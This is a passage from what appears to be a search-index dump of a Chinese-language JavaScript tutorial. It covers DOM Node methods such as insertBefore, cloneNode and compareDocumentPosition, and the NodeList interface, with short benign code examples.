\u5224\u65ad\u4e00\u4e2a\u8282\u70b9\u6709\u6ca1\u6709\u5b50\u8282\u70b9\uff0c\u6709\u8bb8\u591a\u79cd\u65b9\u6cd5\uff0c\u4e0b\u9762\u662f\u5176\u4e2d\u7684\u4e09\u79cd\u3002 node.hasChildNodes() node.firstChild !== null node.childNodes && node.childNodes.length > 0 hasChildNodes \u65b9\u6cd5\u7ed3\u5408 firstChild \u5c5e\u6027\u548c nextSibling \u5c5e\u6027\uff0c\u53ef\u4ee5\u904d\u5386\u5f53\u524d\u8282\u70b9\u7684\u6240\u6709\u540e\u4ee3\u8282\u70b9\u3002 1 2 3 4 5 6 7 8 9 10 11 function DOMComb ( parent , callback ) { if ( parent . hasChildNodes ()) { for ( var node = parent . firstChild ; node ; node = node . nextSibling ) { DOMComb ( node , callback ); } } callback ( parent ); } // \u7528\u6cd5 DOMComb ( document . body , console . log ) \u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c DOMComb \u51fd\u6570\u7684\u7b2c\u4e00\u4e2a\u53c2\u6570\u662f\u67d0\u4e2a\u6307\u5b9a\u7684\u8282\u70b9\uff0c\u7b2c\u4e8c\u4e2a\u53c2\u6570\u662f\u56de\u8c03\u51fd\u6570\u3002\u8fd9\u4e2a\u56de\u8c03\u51fd\u6570\u4f1a\u4f9d\u6b21\u4f5c\u7528\u4e8e\u6307\u5b9a\u8282\u70b9\uff0c\u4ee5\u53ca\u6307\u5b9a\u8282\u70b9\u7684\u6240\u6709\u540e\u4ee3\u8282\u70b9\u3002","title":"Node.prototype.hasChildNodes()"},{"location":"dom/node/#nodeprototypeclonenode","text":"cloneNode \u65b9\u6cd5\u7528\u4e8e\u514b\u9686\u4e00\u4e2a\u8282\u70b9\u3002\u5b83\u63a5\u53d7\u4e00\u4e2a\u5e03\u5c14\u503c\u4f5c\u4e3a\u53c2\u6570\uff0c\u8868\u793a\u662f\u5426\u540c\u65f6\u514b\u9686\u5b50\u8282\u70b9\u3002\u5b83\u7684\u8fd4\u56de\u503c\u662f\u4e00\u4e2a\u514b\u9686\u51fa\u6765\u7684\u65b0\u8282\u70b9\u3002 1 var cloneUL = document . querySelector ( 'ul' ). cloneNode ( true ); \u8be5\u65b9\u6cd5\u6709\u4e00\u4e9b\u4f7f\u7528\u6ce8\u610f\u70b9\u3002 \uff081\uff09\u514b\u9686\u4e00\u4e2a\u8282\u70b9\uff0c\u4f1a\u62f7\u8d1d\u8be5\u8282\u70b9\u7684\u6240\u6709\u5c5e\u6027\uff0c\u4f46\u662f\u4f1a\u4e27\u5931 addEventListener \u65b9\u6cd5\u548c on- \u5c5e\u6027\uff08\u5373 node.onclick = fn \uff09\uff0c\u6dfb\u52a0\u5728\u8fd9\u4e2a\u8282\u70b9\u4e0a\u7684\u4e8b\u4ef6\u56de\u8c03\u51fd\u6570\u3002 \uff082\uff09\u8be5\u65b9\u6cd5\u8fd4\u56de\u7684\u8282\u70b9\u4e0d\u5728\u6587\u6863\u4e4b\u4e2d\uff0c\u5373\u6ca1\u6709\u4efb\u4f55\u7236\u8282\u70b9\uff0c\u5fc5\u987b\u4f7f\u7528\u8bf8\u5982 Node.appendChild \u8fd9\u6837\u7684\u65b9\u6cd5\u6dfb\u52a0\u5230\u6587\u6863\u4e4b\u4e2d\u3002 \uff083\uff09\u514b\u9686\u4e00\u4e2a\u8282\u70b9\u4e4b\u540e\uff0cDOM \u6709\u53ef\u80fd\u51fa\u73b0\u4e24\u4e2a\u6709\u76f8\u540c id \u5c5e\u6027\uff08\u5373 id=\"xxx\" \uff09\u7684\u7f51\u9875\u5143\u7d20\uff0c\u8fd9\u65f6\u5e94\u8be5\u4fee\u6539\u5176\u4e2d\u4e00\u4e2a\u5143\u7d20\u7684 id \u5c5e\u6027\u3002\u5982\u679c\u539f\u8282\u70b9\u6709 name \u5c5e\u6027\uff0c\u53ef\u80fd\u4e5f\u9700\u8981\u4fee\u6539\u3002","title":"Node.prototype.cloneNode()"},{"location":"dom/node/#nodeprototypeinsertbefore","text":"insertBefore \u65b9\u6cd5\u7528\u4e8e\u5c06\u67d0\u4e2a\u8282\u70b9\u63d2\u5165\u7236\u8282\u70b9\u5185\u90e8\u7684\u6307\u5b9a\u4f4d\u7f6e\u3002 1 var insertedNode = parentNode . insertBefore ( newNode , referenceNode ); insertBefore \u65b9\u6cd5\u63a5\u53d7\u4e24\u4e2a\u53c2\u6570\uff0c\u7b2c\u4e00\u4e2a\u53c2\u6570\u662f\u6240\u8981\u63d2\u5165\u7684\u8282\u70b9 newNode \uff0c\u7b2c\u4e8c\u4e2a\u53c2\u6570\u662f\u7236\u8282\u70b9 parentNode \u5185\u90e8\u7684\u4e00\u4e2a\u5b50\u8282\u70b9 referenceNode \u3002 newNode \u5c06\u63d2\u5728 referenceNode \u8fd9\u4e2a\u5b50\u8282\u70b9\u7684\u524d\u9762\u3002\u8fd4\u56de\u503c\u662f\u63d2\u5165\u7684\u65b0\u8282\u70b9 newNode \u3002 1 2 var p = document . createElement ( 'p' ); document . body . insertBefore ( p , document . body . firstChild ); \u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c\u65b0\u5efa\u4e00\u4e2a <p> \u8282\u70b9\uff0c\u63d2\u5728 document.body.firstChild \u7684\u524d\u9762\uff0c\u4e5f\u5c31\u662f\u6210\u4e3a document.body \u7684\u7b2c\u4e00\u4e2a\u5b50\u8282\u70b9\u3002 \u5982\u679c insertBefore \u65b9\u6cd5\u7684\u7b2c\u4e8c\u4e2a\u53c2\u6570\u4e3a null \uff0c\u5219\u65b0\u8282\u70b9\u5c06\u63d2\u5728\u5f53\u524d\u8282\u70b9\u5185\u90e8\u7684\u6700\u540e\u4f4d\u7f6e\uff0c\u5373\u53d8\u6210\u6700\u540e\u4e00\u4e2a\u5b50\u8282\u70b9\u3002 1 2 var p = document . createElement ( 'p' ); document . body . insertBefore ( p , null ); \u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c p \u5c06\u6210\u4e3a document.body \u7684\u6700\u540e\u4e00\u4e2a\u5b50\u8282\u70b9\u3002\u8fd9\u4e5f\u8bf4\u660e insertBefore \u7684\u7b2c\u4e8c\u4e2a\u53c2\u6570\u4e0d\u80fd\u7701\u7565\u3002 \u6ce8\u610f\uff0c\u5982\u679c\u6240\u8981\u63d2\u5165\u7684\u8282\u70b9\u662f\u5f53\u524d DOM \u73b0\u6709\u7684\u8282\u70b9\uff0c\u5219\u8be5\u8282\u70b9\u5c06\u4ece\u539f\u6709\u7684\u4f4d\u7f6e\u79fb\u9664\uff0c\u63d2\u5165\u65b0\u7684\u4f4d\u7f6e\u3002 \u7531\u4e8e\u4e0d\u5b58\u5728 insertAfter \u65b9\u6cd5\uff0c\u5982\u679c\u65b0\u8282\u70b9\u8981\u63d2\u5728\u7236\u8282\u70b9\u7684\u67d0\u4e2a\u5b50\u8282\u70b9\u540e\u9762\uff0c\u53ef\u4ee5\u7528 insertBefore \u65b9\u6cd5\u7ed3\u5408 nextSibling \u5c5e\u6027\u6a21\u62df\u3002 1 parent . insertBefore ( s1 , s2 . nextSibling ); \u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c parent \u662f\u7236\u8282\u70b9\uff0c s1 \u662f\u4e00\u4e2a\u5168\u65b0\u7684\u8282\u70b9\uff0c s2 \u662f\u53ef\u4ee5\u5c06 s1 \u8282\u70b9\uff0c\u63d2\u5728 s2 \u8282\u70b9\u7684\u540e\u9762\u3002\u5982\u679c s2 \u662f\u5f53\u524d\u8282\u70b9\u7684\u6700\u540e\u4e00\u4e2a\u5b50\u8282\u70b9\uff0c\u5219 s2.nextSibling \u8fd4\u56de null \uff0c\u8fd9\u65f6 s1 \u8282\u70b9\u4f1a\u63d2\u5728\u5f53\u524d\u8282\u70b9\u7684\u6700\u540e\uff0c\u53d8\u6210\u5f53\u524d\u8282\u70b9\u7684\u6700\u540e\u4e00\u4e2a\u5b50\u8282\u70b9\uff0c\u7b49\u4e8e\u7d27\u8ddf\u5728 s2 \u7684\u540e\u9762\u3002 \u5982\u679c\u8981\u63d2\u5165\u7684\u8282\u70b9\u662f DocumentFragment \u7c7b\u578b\uff0c\u90a3\u4e48\u63d2\u5165\u7684\u5c06\u662f DocumentFragment \u7684\u6240\u6709\u5b50\u8282\u70b9\uff0c\u800c\u4e0d\u662f DocumentFragment \u8282\u70b9\u672c\u8eab\u3002\u8fd4\u56de\u503c\u5c06\u662f\u4e00\u4e2a\u7a7a\u7684 DocumentFragment \u8282\u70b9\u3002","title":"Node.prototype.insertBefore()"},{"location":"dom/node/#nodeprototyperemovechild","text":"removeChild \u65b9\u6cd5\u63a5\u53d7\u4e00\u4e2a\u5b50\u8282\u70b9\u4f5c\u4e3a\u53c2\u6570\uff0c\u7528\u4e8e\u4ece\u5f53\u524d\u8282\u70b9\u79fb\u9664\u8be5\u5b50\u8282\u70b9\u3002\u8fd4\u56de\u503c\u662f\u79fb\u9664\u7684\u5b50\u8282\u70b9\u3002 1 2 var divA = document . getElementById ( 'A' ); divA . parentNode . removeChild ( divA ); \u4e0a\u9762\u4ee3\u7801\u79fb\u9664\u4e86 divA \u8282\u70b9\u3002\u6ce8\u610f\uff0c\u8fd9\u4e2a\u65b9\u6cd5\u662f\u5728 divA \u7684\u7236\u8282\u70b9\u4e0a\u8c03\u7528\u7684\uff0c\u4e0d\u662f\u5728 divA \u4e0a\u8c03\u7528\u7684\u3002 \u4e0b\u9762\u662f\u5982\u4f55\u79fb\u9664\u5f53\u524d\u8282\u70b9\u7684\u6240\u6709\u5b50\u8282\u70b9\u3002 1 2 3 4 var element = document . getElementById ( 'top' ); while ( element . firstChild ) { element . removeChild ( element . firstChild ); } \u88ab\u79fb\u9664\u7684\u8282\u70b9\u4f9d\u7136\u5b58\u5728\u4e8e\u5185\u5b58\u4e4b\u4e2d\uff0c\u4f46\u4e0d\u518d\u662f DOM \u7684\u4e00\u90e8\u5206\u3002\u6240\u4ee5\uff0c\u4e00\u4e2a\u8282\u70b9\u79fb\u9664\u4ee5\u540e\uff0c\u4f9d\u7136\u53ef\u4ee5\u4f7f\u7528\u5b83\uff0c\u6bd4\u5982\u63d2\u5165\u5230\u53e6\u4e00\u4e2a\u8282\u70b9\u4e0b\u9762\u3002 \u5982\u679c\u53c2\u6570\u8282\u70b9\u4e0d\u662f\u5f53\u524d\u8282\u70b9\u7684\u5b50\u8282\u70b9\uff0c removeChild \u65b9\u6cd5\u5c06\u62a5\u9519\u3002","title":"Node.prototype.removeChild()"},{"location":"dom/node/#nodeprototypereplacechild","text":"replaceChild \u65b9\u6cd5\u7528\u4e8e\u5c06\u4e00\u4e2a\u65b0\u7684\u8282\u70b9\uff0c\u66ff\u6362\u5f53\u524d\u8282\u70b9\u7684\u67d0\u4e00\u4e2a\u5b50\u8282\u70b9\u3002 1 var replacedNode = parentNode . replaceChild ( newChild , oldChild ); \u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c replaceChild \u65b9\u6cd5\u63a5\u53d7\u4e24\u4e2a\u53c2\u6570\uff0c\u7b2c\u4e00\u4e2a\u53c2\u6570 newChild \u662f\u7528\u6765\u66ff\u6362\u7684\u65b0\u8282\u70b9\uff0c\u7b2c\u4e8c\u4e2a\u53c2\u6570 oldChild \u662f\u5c06\u8981\u66ff\u6362\u8d70\u7684\u5b50\u8282\u70b9\u3002\u8fd4\u56de\u503c\u662f\u66ff\u6362\u8d70\u7684\u90a3\u4e2a\u8282\u70b9 oldChild \u3002 1 2 3 4 var divA = document . getElementById ( 'divA' ); var newSpan = document . createElement ( 'span' ); newSpan . textContent = 'Hello World!' ; divA . parentNode . replaceChild ( newSpan , divA ); \u4e0a\u9762\u4ee3\u7801\u662f\u5982\u4f55\u5c06\u6307\u5b9a\u8282\u70b9 divA \u66ff\u6362\u8d70\u3002","title":"Node.prototype.replaceChild()"},{"location":"dom/node/#nodeprototypecontains","text":"contains \u65b9\u6cd5\u8fd4\u56de\u4e00\u4e2a\u5e03\u5c14\u503c\uff0c\u8868\u793a\u53c2\u6570\u8282\u70b9\u662f\u5426\u6ee1\u8db3\u4ee5\u4e0b\u4e09\u4e2a\u6761\u4ef6\u4e4b\u4e00\u3002 \u53c2\u6570\u8282\u70b9\u4e3a\u5f53\u524d\u8282\u70b9\u3002 \u53c2\u6570\u8282\u70b9\u4e3a\u5f53\u524d\u8282\u70b9\u7684\u5b50\u8282\u70b9\u3002 \u53c2\u6570\u8282\u70b9\u4e3a\u5f53\u524d\u8282\u70b9\u7684\u540e\u4ee3\u8282\u70b9\u3002 1 document . body . contains ( node ) \u4e0a\u9762\u4ee3\u7801\u68c0\u67e5\u53c2\u6570\u8282\u70b9 node \uff0c\u662f\u5426\u5305\u542b\u5728\u5f53\u524d\u6587\u6863\u4e4b\u4e2d\u3002 \u6ce8\u610f\uff0c\u5f53\u524d\u8282\u70b9\u4f20\u5165 contains \u65b9\u6cd5\uff0c\u8fd4\u56de true \u3002 1 nodeA . contains ( nodeA ) // true","title":"Node.prototype.contains()"},{"location":"dom/node/#nodeprototypecomparedocumentposition","text":"compareDocumentPosition \u65b9\u6cd5\u7684\u7528\u6cd5\uff0c\u4e0e contains \u65b9\u6cd5\u5b8c\u5168\u4e00\u81f4\uff0c\u8fd4\u56de\u4e00\u4e2a\u516d\u4e2a\u6bd4\u7279\u4f4d\u7684\u4e8c\u8fdb\u5236\u503c\uff0c\u8868\u793a\u53c2\u6570\u8282\u70b9\u4e0e\u5f53\u524d\u8282\u70b9\u7684\u5173\u7cfb\u3002 \u4e8c\u8fdb\u5236\u503c \u5341\u8fdb\u5236\u503c \u542b\u4e49 000000 0 \u4e24\u4e2a\u8282\u70b9\u76f8\u540c 000001 1 \u4e24\u4e2a\u8282\u70b9\u4e0d\u5728\u540c\u4e00\u4e2a\u6587\u6863\uff08\u5373\u6709\u4e00\u4e2a\u8282\u70b9\u4e0d\u5728\u5f53\u524d\u6587\u6863\uff09 000010 2 \u53c2\u6570\u8282\u70b9\u5728\u5f53\u524d\u8282\u70b9\u7684\u524d\u9762 000100 4 \u53c2\u6570\u8282\u70b9\u5728\u5f53\u524d\u8282\u70b9\u7684\u540e\u9762 001000 8 \u53c2\u6570\u8282\u70b9\u5305\u542b\u5f53\u524d\u8282\u70b9 010000 16 \u5f53\u524d\u8282\u70b9\u5305\u542b\u53c2\u6570\u8282\u70b9 100000 32 \u6d4f\u89c8\u5668\u5185\u90e8\u4f7f\u7528 1 2 3 4 5 6 7 8 9 10 // HTML \u4ee3\u7801\u5982\u4e0b // <div id=\"mydiv\"> // <form><input id=\"test\" /></form> // </div> var div = document . getElementById ( 'mydiv' ); var input = document . getElementById ( 'test' ); div . compareDocumentPosition ( input ) // 20 input . compareDocumentPosition ( div ) // 10 \u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c\u8282\u70b9 div \u5305\u542b\u8282\u70b9 input \uff08\u4e8c\u8fdb\u5236 010000 \uff09\uff0c\u800c\u4e14\u8282\u70b9 input \u5728\u8282\u70b9 div \u7684\u540e\u9762\uff08\u4e8c\u8fdb\u5236 000100 \uff09\uff0c\u6240\u4ee5\u7b2c\u4e00\u4e2a compareDocumentPosition \u65b9\u6cd5\u8fd4\u56de 20 \uff08\u4e8c\u8fdb\u5236 010100 \uff0c\u5373 010000 + 000100 \uff09\uff0c\u7b2c\u4e8c\u4e2a compareDocumentPosition \u65b9\u6cd5\u8fd4\u56de 10 \uff08\u4e8c\u8fdb\u5236 001010 \uff09\u3002 \u7531\u4e8e compareDocumentPosition \u8fd4\u56de\u503c\u7684\u542b\u4e49\uff0c\u5b9a\u4e49\u5728\u6bcf\u4e00\u4e2a\u6bd4\u7279\u4f4d\u4e0a\uff0c\u6240\u4ee5\u5982\u679c\u8981\u68c0\u67e5\u67d0\u4e00\u79cd\u7279\u5b9a\u7684\u542b\u4e49\uff0c\u5c31\u9700\u8981\u4f7f\u7528\u6bd4\u7279\u4f4d\u8fd0\u7b97\u7b26\u3002 1 2 3 4 5 6 7 var head = document . head ; var body = document . body ; if ( head . compareDocumentPosition ( body ) & 4 ) { console . log ( '\u6587\u6863\u7ed3\u6784\u6b63\u786e' ); } else { console . log ( '<body> \u4e0d\u80fd\u5728 <head> \u524d\u9762' ); } \u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c compareDocumentPosition \u7684\u8fd4\u56de\u503c\u4e0e 4 \uff08\u53c8\u79f0\u63a9\u7801\uff09\u8fdb\u884c\u4e0e\u8fd0\u7b97\uff08 & \uff09\uff0c\u5f97\u5230\u4e00\u4e2a\u5e03\u5c14\u503c\uff0c\u8868\u793a <head> \u662f\u5426\u5728 <body> \u524d\u9762\u3002","title":"Node.prototype.compareDocumentPosition()"},{"location":"dom/node/#nodeprototypeisequalnodenodeprototypeissamenode","text":"isEqualNode \u65b9\u6cd5\u8fd4\u56de\u4e00\u4e2a\u5e03\u5c14\u503c\uff0c\u7528\u4e8e\u68c0\u67e5\u4e24\u4e2a\u8282\u70b9\u662f\u5426\u76f8\u7b49\u3002\u6240\u8c13\u76f8\u7b49\u7684\u8282\u70b9\uff0c\u6307\u7684\u662f\u4e24\u4e2a\u8282\u70b9\u7684\u7c7b\u578b\u76f8\u540c\u3001\u5c5e\u6027\u76f8\u540c\u3001\u5b50\u8282\u70b9\u76f8\u540c\u3002 1 2 3 4 var p1 = document . createElement ( 'p' ); var p2 = document . createElement ( 'p' ); p1 . isEqualNode ( p2 ) // true isSameNode \u65b9\u6cd5\u8fd4\u56de\u4e00\u4e2a\u5e03\u5c14\u503c\uff0c\u8868\u793a\u4e24\u4e2a\u8282\u70b9\u662f\u5426\u4e3a\u540c\u4e00\u4e2a\u8282\u70b9\u3002 1 2 3 4 5 var p1 = document . createElement ( 'p' ); var p2 = document . createElement ( 'p' ); p1 . isSameNode ( p2 ) // false p1 . isSameNode ( p1 ) // true","title":"Node.prototype.isEqualNode()\uff0cNode.prototype.isSameNode()"},{"location":"dom/node/#nodeprototypenormalize","text":"normalize \u65b9\u6cd5\u7528\u4e8e\u6e05\u7406\u5f53\u524d\u8282\u70b9\u5185\u90e8\u7684\u6240\u6709\u6587\u672c\u8282\u70b9\uff08text\uff09\u3002\u5b83\u4f1a\u53bb\u9664\u7a7a\u7684\u6587\u672c\u8282\u70b9\uff0c\u5e76\u4e14\u5c06\u6bd7\u90bb\u7684\u6587\u672c\u8282\u70b9\u5408\u5e76\u6210\u4e00\u4e2a\uff0c\u4e5f\u5c31\u662f\u8bf4\u4e0d\u5b58\u5728\u7a7a\u7684\u6587\u672c\u8282\u70b9\uff0c\u4ee5\u53ca\u6bd7\u90bb\u7684\u6587\u672c\u8282\u70b9\u3002 1 2 3 4 5 6 7 8 var wrapper = document . createElement ( 'div' ); wrapper . appendChild ( document . createTextNode ( 'Part 1 ' )); wrapper . appendChild ( document . createTextNode ( 'Part 2 ' )); wrapper . childNodes . length // 2 wrapper . normalize (); wrapper . childNodes . length // 1 \u4e0a\u9762\u4ee3\u7801\u4f7f\u7528 normalize \u65b9\u6cd5\u4e4b\u524d\uff0c wrapper \u8282\u70b9\u6709\u4e24\u4e2a\u6bd7\u90bb\u7684\u6587\u672c\u5b50\u8282\u70b9\u3002\u4f7f\u7528 normalize \u65b9\u6cd5\u4e4b\u540e\uff0c\u4e24\u4e2a\u6587\u672c\u5b50\u8282\u70b9\u88ab\u5408\u5e76\u6210\u4e00\u4e2a\u3002 \u8be5\u65b9\u6cd5\u662f Text.splitText \u7684\u9006\u65b9\u6cd5\uff0c\u53ef\u4ee5\u67e5\u770b\u300aText \u8282\u70b9\u5bf9\u8c61\u300b\u4e00\u7ae0\uff0c\u4e86\u89e3\u66f4\u591a\u5185\u5bb9\u3002","title":"Node.prototype.normalize()"},{"location":"dom/node/#nodeprototypegetrootnode","text":"getRootNode() \u65b9\u6cd5\u8fd4\u56de\u5f53\u524d\u8282\u70b9\u6240\u5728\u6587\u6863\u7684\u6839\u8282\u70b9 document \uff0c\u4e0e ownerDocument \u5c5e\u6027\u7684\u4f5c\u7528\u76f8\u540c\u3002 1 2 3 4 document . body . firstChild . getRootNode () === document // true document . body . firstChild . getRootNode () === document . body . firstChild . ownerDocument // true \u8be5\u65b9\u6cd5\u53ef\u7528\u4e8e document \u8282\u70b9\u81ea\u8eab\uff0c\u8fd9\u4e00\u70b9\u4e0e document.ownerDocument \u4e0d\u540c\u3002 1 2 document . getRootNode () // document document . ownerDocument // null","title":"Node.prototype.getRootNode()"},{"location":"dom/nodelist/","text":"NodeList \u63a5\u53e3\uff0cHTMLCollection \u63a5\u53e3 \u00b6 \u8282\u70b9\u90fd\u662f\u5355\u4e2a\u5bf9\u8c61\uff0c\u6709\u65f6\u9700\u8981\u4e00\u79cd\u6570\u636e\u7ed3\u6784\uff0c\u80fd\u591f\u5bb9\u7eb3\u591a\u4e2a\u8282\u70b9\u3002DOM \u63d0\u4f9b\u4e24\u79cd\u8282\u70b9\u96c6\u5408\uff0c\u7528\u4e8e\u5bb9\u7eb3\u591a\u4e2a\u8282\u70b9\uff1a NodeList \u548c HTMLCollection \u3002 \u8fd9\u4e24\u79cd\u96c6\u5408\u90fd\u5c5e\u4e8e\u63a5\u53e3\u89c4\u8303\u3002\u8bb8\u591a DOM \u5c5e\u6027\u548c\u65b9\u6cd5\uff0c\u8fd4\u56de\u7684\u7ed3\u679c\u662f NodeList \u5b9e\u4f8b\u6216 HTMLCollection \u5b9e\u4f8b\u3002\u4e3b\u8981\u533a\u522b\u662f\uff0c NodeList \u53ef\u4ee5\u5305\u542b\u5404\u79cd\u7c7b\u578b\u7684\u8282\u70b9\uff0c HTMLCollection \u53ea\u80fd\u5305\u542b HTML \u5143\u7d20\u8282\u70b9\u3002 NodeList \u63a5\u53e3 \u00b6 \u6982\u8ff0 \u00b6 NodeList \u5b9e\u4f8b\u662f\u4e00\u4e2a\u7c7b\u4f3c\u6570\u7ec4\u7684\u5bf9\u8c61\uff0c\u5b83\u7684\u6210\u5458\u662f\u8282\u70b9\u5bf9\u8c61\u3002\u901a\u8fc7\u4ee5\u4e0b\u65b9\u6cd5\u53ef\u4ee5\u5f97\u5230 NodeList \u5b9e\u4f8b\u3002 Node.childNodes document.querySelectorAll() \u7b49\u8282\u70b9\u641c\u7d22\u65b9\u6cd5 1 document . body . childNodes instanceof NodeList // true NodeList \u5b9e\u4f8b\u5f88\u50cf\u6570\u7ec4\uff0c\u53ef\u4ee5\u4f7f\u7528 length \u5c5e\u6027\u548c forEach \u65b9\u6cd5\u3002\u4f46\u662f\uff0c\u5b83\u4e0d\u662f\u6570\u7ec4\uff0c\u4e0d\u80fd\u4f7f\u7528 pop \u6216 push \u4e4b\u7c7b\u6570\u7ec4\u7279\u6709\u7684\u65b9\u6cd5\u3002 1 2 3 4 5 6 var children = document . body . childNodes ; Array . isArray ( children ) // false children . length // 34 children . forEach ( console . log ) \u4e0a\u9762\u4ee3\u7801\u4e2d\uff0cNodeList \u5b9e\u4f8b children \u4e0d\u662f\u6570\u7ec4\uff0c\u4f46\u662f\u5177\u6709 length \u5c5e\u6027\u548c forEach \u65b9\u6cd5\u3002 \u5982\u679c NodeList \u5b9e\u4f8b\u8981\u4f7f\u7528\u6570\u7ec4\u65b9\u6cd5\uff0c\u53ef\u4ee5\u5c06\u5176\u8f6c\u4e3a\u771f\u6b63\u7684\u6570\u7ec4\u3002 1 2 var children = document . body . childNodes ; var nodeArr = Array . prototype . slice . call ( children ); \u9664\u4e86\u4f7f\u7528 forEach \u65b9\u6cd5\u904d\u5386 NodeList \u5b9e\u4f8b\uff0c\u8fd8\u53ef\u4ee5\u4f7f\u7528 for \u5faa\u73af\u3002 1 2 3 4 5 var children = document . body . childNodes ; for ( var i = 0 ; i < children . length ; i ++ ) { var item = children [ i ]; } \u6ce8\u610f\uff0cNodeList \u5b9e\u4f8b\u53ef\u80fd\u662f\u52a8\u6001\u96c6\u5408\uff0c\u4e5f\u53ef\u80fd\u662f\u9759\u6001\u96c6\u5408\u3002\u6240\u8c13\u52a8\u6001\u96c6\u5408\u5c31\u662f\u4e00\u4e2a\u6d3b\u7684\u96c6\u5408\uff0cDOM \u5220\u9664\u6216\u65b0\u589e\u4e00\u4e2a\u76f8\u5173\u8282\u70b9\uff0c\u90fd\u4f1a\u7acb\u523b\u53cd\u6620\u5728 NodeList \u5b9e\u4f8b\u3002\u76ee\u524d\uff0c\u53ea\u6709 Node.childNodes \u8fd4\u56de\u7684\u662f\u4e00\u4e2a\u52a8\u6001\u96c6\u5408\uff0c\u5176\u4ed6\u7684 NodeList \u90fd\u662f\u9759\u6001\u96c6\u5408\u3002 1 2 3 4 var children = document . body . childNodes ; children . length // 18 document . body . appendChild ( document . createElement ( 'p' )); children . length // 19 \u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c\u6587\u6863\u589e\u52a0\u4e00\u4e2a\u5b50\u8282\u70b9\uff0cNodeList \u5b9e\u4f8b children \u7684 length \u5c5e\u6027\u5c31\u589e\u52a0\u4e861\u3002 NodeList.prototype.length \u00b6 length \u5c5e\u6027\u8fd4\u56de NodeList \u5b9e\u4f8b\u5305\u542b\u7684\u8282\u70b9\u6570\u91cf\u3002 1 2 document . querySelectorAll ( 'xxx' ). length // 0 \u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c document.querySelectorAll \u8fd4\u56de\u4e00\u4e2a NodeList \u96c6\u5408\u3002\u5bf9\u4e8e\u90a3\u4e9b\u4e0d\u5b58\u5728\u7684 HTML \u6807\u7b7e\uff0c length \u5c5e\u6027\u8fd4\u56de 0 \u3002 NodeList.prototype.forEach() \u00b6 forEach \u65b9\u6cd5\u7528\u4e8e\u904d\u5386 NodeList \u7684\u6240\u6709\u6210\u5458\u3002\u5b83\u63a5\u53d7\u4e00\u4e2a\u56de\u8c03\u51fd\u6570\u4f5c\u4e3a\u53c2\u6570\uff0c\u6bcf\u4e00\u8f6e\u904d\u5386\u5c31\u6267\u884c\u4e00\u6b21\u8fd9\u4e2a\u56de\u8c03\u51fd\u6570\uff0c\u7528\u6cd5\u4e0e\u6570\u7ec4\u5b9e\u4f8b\u7684 forEach \u65b9\u6cd5\u5b8c\u5168\u4e00\u81f4\u3002 1 2 3 4 var children = document . body . childNodes ; children . forEach ( function f ( item , i , list ) { // ... }, this ); \u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c\u56de\u8c03\u51fd\u6570 f \u7684\u4e09\u4e2a\u53c2\u6570\u4f9d\u6b21\u662f\u5f53\u524d\u6210\u5458\u3001\u4f4d\u7f6e\u548c\u5f53\u524d NodeList \u5b9e\u4f8b\u3002 forEach \u65b9\u6cd5\u7684\u7b2c\u4e8c\u4e2a\u53c2\u6570\uff0c\u7528\u4e8e\u7ed1\u5b9a\u56de\u8c03\u51fd\u6570\u5185\u90e8\u7684 this \uff0c\u8be5\u53c2\u6570\u53ef\u7701\u7565\u3002 NodeList.prototype.item() \u00b6 item \u65b9\u6cd5\u63a5\u53d7\u4e00\u4e2a\u6574\u6570\u503c\u4f5c\u4e3a\u53c2\u6570\uff0c\u8868\u793a\u6210\u5458\u7684\u4f4d\u7f6e\uff0c\u8fd4\u56de\u8be5\u4f4d\u7f6e\u4e0a\u7684\u6210\u5458\u3002 1 document . body . childNodes . item ( 0 ) \u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c item(0) \u8fd4\u56de\u7b2c\u4e00\u4e2a\u6210\u5458\u3002 \u5982\u679c\u53c2\u6570\u503c\u5927\u4e8e\u5b9e\u9645\u957f\u5ea6\uff0c\u6216\u8005\u7d22\u5f15\u4e0d\u5408\u6cd5\uff08\u6bd4\u5982\u8d1f\u6570\uff09\uff0c item \u65b9\u6cd5\u8fd4\u56de null \u3002\u5982\u679c\u7701\u7565\u53c2\u6570\uff0c item \u65b9\u6cd5\u4f1a\u62a5\u9519\u3002 \u6240\u6709\u7c7b\u4f3c\u6570\u7ec4\u7684\u5bf9\u8c61\uff0c\u90fd\u53ef\u4ee5\u4f7f\u7528\u65b9\u62ec\u53f7\u8fd0\u7b97\u7b26\u53d6\u51fa\u6210\u5458\u3002\u4e00\u822c\u60c5\u51b5\u4e0b\uff0c\u90fd\u662f\u4f7f\u7528\u65b9\u62ec\u53f7\u8fd0\u7b97\u7b26\uff0c\u800c\u4e0d\u4f7f\u7528 item \u65b9\u6cd5\u3002 1 document . body . childNodes [ 0 ] NodeList.prototype.keys()\uff0cNodeList.prototype.values()\uff0cNodeList.prototype.entries() \u00b6 \u8fd9\u4e09\u4e2a\u65b9\u6cd5\u90fd\u8fd4\u56de\u4e00\u4e2a ES6 \u7684\u904d\u5386\u5668\u5bf9\u8c61\uff0c\u53ef\u4ee5\u901a\u8fc7 for...of \u5faa\u73af\u904d\u5386\u83b7\u53d6\u6bcf\u4e00\u4e2a\u6210\u5458\u7684\u4fe1\u606f\u3002\u533a\u522b\u5728\u4e8e\uff0c keys() \u8fd4\u56de\u952e\u540d\u7684\u904d\u5386\u5668\uff0c values() \u8fd4\u56de\u952e\u503c\u7684\u904d\u5386\u5668\uff0c entries() \u8fd4\u56de\u7684\u904d\u5386\u5668\u540c\u65f6\u5305\u542b\u952e\u540d\u548c\u952e\u503c\u7684\u4fe1\u606f\u3002 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 var children = document . body . childNodes ; for ( var key of children . keys ()) { console . log ( key ); } // 0 // 1 // 2 // ... for ( var value of children . values ()) { console . log ( value ); } // #text // <script> // ... for ( var entry of children . entries ()) { console . log ( entry ); } // Array [ 0, #text ] // Array [ 1, <script> ] // ... HTMLCollection \u63a5\u53e3 \u00b6 \u6982\u8ff0 \u00b6 HTMLCollection 